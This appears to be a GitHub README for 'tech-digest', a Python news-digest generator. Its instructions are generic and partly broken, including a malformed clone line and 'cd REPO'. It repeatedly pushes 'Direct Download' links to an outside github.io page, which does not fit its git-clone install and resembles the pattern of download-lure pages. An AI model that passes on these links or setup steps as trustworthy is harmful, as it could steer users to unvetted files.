# tech-digest v2026 - news digest generator 2026

> **tech-digest is a Python-driven news digest generator for AI and developer coverage. It collects stories, summarizes them with Claude, and outputs refined Markdown and HTML reports in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-Python-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/evanio44/tech-digest-ai-news?style=flat-square)](https://github.com/evanio44/tech-digest-ai-news)

---

<p align="center">
  <a href="https://evanio44.github.io/tech-digest-ai-news/">
    <img src="https://img.shields.io/badge/Download-tech-digest%20Latest-brightgreen?style=for-the-badge" alt="Download tech-digest">
  </a>
</p>

> **[Direct Download - tech-digest v2026](https://evanio44.github.io/tech-digest-ai-news/)**

---

[Download Latest Build](https://evanio44.github.io/tech-digest-ai-news/)

---

## What tech-digest Does

tech-digest is designed to turn rapidly changing AI and developer news into a concise daily briefing. It pulls in high-signal inputs like Hacker News and GitHub Trending, then reshapes them into a digest that is much easier to review than a stream of raw updates.

It is a good fit for anyone who wants a compact snapshot of shifts across developer tools, AI, and technical communities without checking several sources by hand. The project can produce both Markdown and styled HTML, which makes it easy to publish, archive, or share the results in different workflows.

---

## Capabilities

- Gathers news from AI and developer-oriented sources with strong signal
- Can enrich items with images and first-paragraph context
- Applies summarization so dense stories become short digest entries
- Builds organized daily output that is easier to read and distribute
- Exports reports in both Markdown and styled HTML
- Maintains a rolling 7-day topic index for recent coverage
- Built to run on a schedule with automation in mind
- Centers on AI, Claude, tech news, dev tools, and trending GitHub projects

---

## Installation

Clone the repository and install the project in your Python environment:

- `git clone https://github.com/evanio44/tech-digest-ai-news.git
- `cd REPO`
- install any required dependencies for your environment

For the first run, start the main digest workflow from the project root and use the entry point configured for your setup. If you plan to run it on a schedule, make sure the job targets the correct repository path and output destination.

---

## How to Use It

A common workflow is:

1. Pull the latest items from the configured news feeds and trend sources.
2. Summarize or refine the items into digest-ready entries.
3. Generate the final report in Markdown, HTML, or both.
4. Publish or save the output in the location you want consumers to use.
5. Repeat the process on a schedule so the digest stays current.

Example usage pattern:

- run the generator manually for an on-demand update
- schedule it to produce a daily summary
- review the 7-day topic index to track recurring themes
- reuse the Markdown output in docs, posts, or internal updates

---

## Configuration

Configuration is usually stored in the project settings used by the generator and any scheduled runs. Typical values cover source selection, output format preferences, and automation timing.

Example structure:

{
  "sources": ["Hacker News", "GitHub Trending"],
  "output_format": ["markdown", "html"],
  "schedule": "daily",
  "topic_window_days": 7
}

If your setup relies on environment variables or local config files, keep the source list, summary behavior, and publish path aligned with the same execution target.

---

## Requirements

- Python environment
- Access to the configured news and trend sources
- Storage for generated Markdown and HTML output
- A runtime setup suitable for scheduled automation if you plan to run it regularly

---

## FAQ

**Can it update automatically?**  
Yes. The project supports scheduled automated runs.

**Can I output more than one format?**  
Yes. It produces both Markdown and styled HTML.

**What does it cover?**  
It focuses on AI, Claude, dev tools, tech news, Hacker News, and GitHub Trending.

**Where are the settings changed?**  
In the project configuration used by your local or automated workflow. The main areas to review are source selection, output format, and scheduling.

**What should I check if a source changes or a run breaks?**  
Review the configured source list, confirm the runtime environment, and verify that the output path and schedule are still correct.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
